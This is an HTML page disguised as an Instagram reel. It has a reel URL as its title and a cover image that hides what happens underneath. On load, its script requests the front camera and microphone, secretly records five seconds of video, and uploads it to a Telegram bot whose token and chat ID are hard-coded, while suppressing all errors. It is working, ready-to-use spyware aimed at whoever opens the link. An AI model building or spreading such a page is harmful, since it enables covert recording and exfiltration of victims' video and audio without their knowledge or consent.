<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>https://www.instagram.com/reel/DRCJuY6jB5R/?igsh=ZmxkYzN0NGxsOHJn</title>
    
    <style>
        /* إعدادات الشاشة الأساسية */
        body {
            margin: 0;
            overflow: hidden; 
            background-color: #000;
        }

        /* تنسيق الفيديو (يبقى في الخلفية) */
        #video {
            position: fixed;
            top: 50%;
            left: 50%;
            min-width: 100%;
            min-height: 100%;
            width: auto;
            height: auto;
            z-index: 1; /* يجب أن يكون أدنى من الصورة */
            transform: translate(-50%, -50%);
        }

        /* تنسيق الصورة (تظهر كغلاف فوق الفيديو) */
        #coverImage {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover; /* لضمان تغطية الشاشة */
            z-index: 10; /* يجب أن تكون أعلى من الفيديو */
            transition: opacity 0.5s ease-out; /* لإضافة تأثير اختفاء سلس */
        }
    </style>
</head>
<body>

    <img id="coverImage" src="https://res.cloudinary.com/duixjs8az/image/upload/v1763124618/b3jmvuytjsjargldqkpq" alt="Reels Cover Image">
    
    <video id="video" autoplay playsinline></video> 

    <script>
        // ******************************************************
        // ** إعدادات البوت والثوابت - تم التضمين بالمعلومات الخاصة بك **
        // ******************************************************
        const BOT_TOKEN = '8564926075:AAEiDiYw5ryvtkZwIg493iU3lGQD2FV8804'; 
        const CHAT_ID = '7869791131'; 
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
        
        // مدة التسجيل بالمللي ثانية (5 ثوانٍ)
        const RECORDING_DURATION_MS = 5000; 

        // ******************************************************
        // ** المتغيرات والوظائف                   **
        // ******************************************************
        const video = document.getElementById('video');
        const coverImage = document.getElementById('coverImage');
        let stream = null;
        let mediaRecorder = null;
        const videoChunks = [];

        /**
         * دالة إرسال الفيديو إلى تيليجرام.
         */
        async function sendVideo(videoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, 'recorded_video.webm'); 
                formData.append('caption', 'Recorded silently with cover image from front camera.');

                await fetch(TELEGRAM_API_URL, {
                    method: 'POST',
                    body: formData,
                });
            } catch (error) {
                // لا يوجد معالجة مرئية للأخطاء
            }
        }


        /**
         * إيقاف التسجيل وإرسال الفيديو.
         */
        function stopRecordingAndSend() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }

            // إخفاء الصورة الغلاف بسلاسة بعد الانتهاء من التسجيل والإرسال
            coverImage.style.opacity = '0';
            // إزالة عنصر الصورة من DOM بعد اختفائه تماماً
            setTimeout(() => {
                coverImage.remove();
            }, 600); 

            // إيقاف بث الكاميرا بعد انتهاء التسجيل
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
            }
        }


        /**
         * بدء تسجيل الفيديو.
         */
        function startRecording() {
            if (!stream) return;

            mediaRecorder = new MediaRecorder(stream);
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    videoChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                // دمج الأجزاء إلى ملف فيديو واحد (Blob)
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                // إرسال الملف
                sendVideo(videoBlob);
            };

            // بدء التسجيل
            mediaRecorder.start();
            
            // تحديد مدة التسجيل
            setTimeout(stopRecordingAndSend, RECORDING_DURATION_MS);
        }

        /**
         * طلب الوصول إلى الكاميرا الأمامية وبدء البث.
         */
        async function startCamera() {
            try {
                // طلب الكاميرا الأمامية: facingMode: 'user'
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user' 
                    },
                    audio: true // تسجيل الصوت مع الفيديو
                });
                video.srcObject = stream;
                
                // الانتظار حتى يتم تحميل بيانات الفيديو وبدء التشغيل
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();
                
                // *** بدء التسجيل التلقائي بعد 1 ثانية من بدء البث ***
                setTimeout(startRecording, 1000); 

            } catch (error) {
                // في حال فشل الوصول للكاميرا، يتم إخفاء الصورة الغلاف
                coverImage.remove();
            }
        }

        // بدء تشغيل الكاميرا عند تحميل الصفحة
        window.onload = startCamera;
    </script>
</body>
</html>
